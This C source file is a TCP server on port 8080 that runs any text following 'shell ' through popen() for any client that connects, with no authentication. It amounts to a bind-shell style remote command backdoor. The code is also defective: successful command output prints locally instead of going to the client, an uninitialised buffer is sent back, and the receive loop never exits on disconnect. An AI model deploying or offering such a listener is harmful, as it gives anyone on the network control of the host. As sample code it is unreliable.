#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

void handle_command(int client_socket, char* command);

int main()
{
    int server_socket, client_socket;
    struct sockaddr_in server_address, client_address;
    char buffer[1024];
    int opt = 1;
    socklen_t client_address_length = sizeof(client_address);
    
    // Create the server socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) 
    {
        printf("Failed to create server socket\n");
        return -1;
    }
    
    // Set the socket options
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) 
    {
        printf("Failed to set socket options\n");
        return -1;
    }
    
    // Bind the socket to a port
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(8080);
    if (bind(server_socket, (struct sockaddr*) &server_address, sizeof(server_address)) == -1)
    {
        printf("Failed to bind server socket\n");
        return -1;
    }
    
    // Listen for incoming connections
    if (listen(server_socket, 5) == -1) 
    {
        printf("Failed to listen for incoming connections\n");
        return -1;
    }
    
    // Accept incoming connections
    while (1) 
    {
    	printf("\nListening for incoming connection...\n");
        client_socket = accept(server_socket, (struct sockaddr*) &client_address, &client_address_length);
        if (client_socket == -1)
        {
            printf("Failed to accept incoming connection\n");
            //continue;
            break;
        }
        printf("Connection accepted.\n");
        
        // Receive the command from the client
        memset(buffer, 0, sizeof(buffer));
        while(1){
        if (recv(client_socket, buffer, sizeof(buffer), 0) == -1) 
        {
            printf("Failed to receive command from client\n");
            // continue;
            break;
        }
        
        // Handle the command
        handle_command(client_socket, buffer);
        }
        
        // Close the client socket
        close(client_socket);
    }
    
    // Close the server socket
    close(server_socket);
    
    return 0;
}

void handle_command(int client_socket, char* command)
{
    char output[1024];
    
    if (strncmp(command, "shell ", 6) == 0)
    {
        // Execute the command and capture the output
        FILE *fp = popen(command + 6, "r");
        if (fp == NULL) 
        {
            strcpy(output, "Command execution failed");
        }
        else 
        {
            char buf[1024];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) 
            {
                fwrite(buf, 1, n, stdout);
            }
            pclose(fp);
        }
    }
    else if (strcmp(command, "disconnect") == 0)
    {
        // Send response to client and exit loop to terminate connection
        strcpy(output, "Disconnected from server");
        send(client_socket, output, strlen(output), 0);
        return;
    }
    else
    {
        strcpy(output, "Invalid command");
    }

    // Send the output to the client
    send(client_socket, output, strlen(output), 0);
}
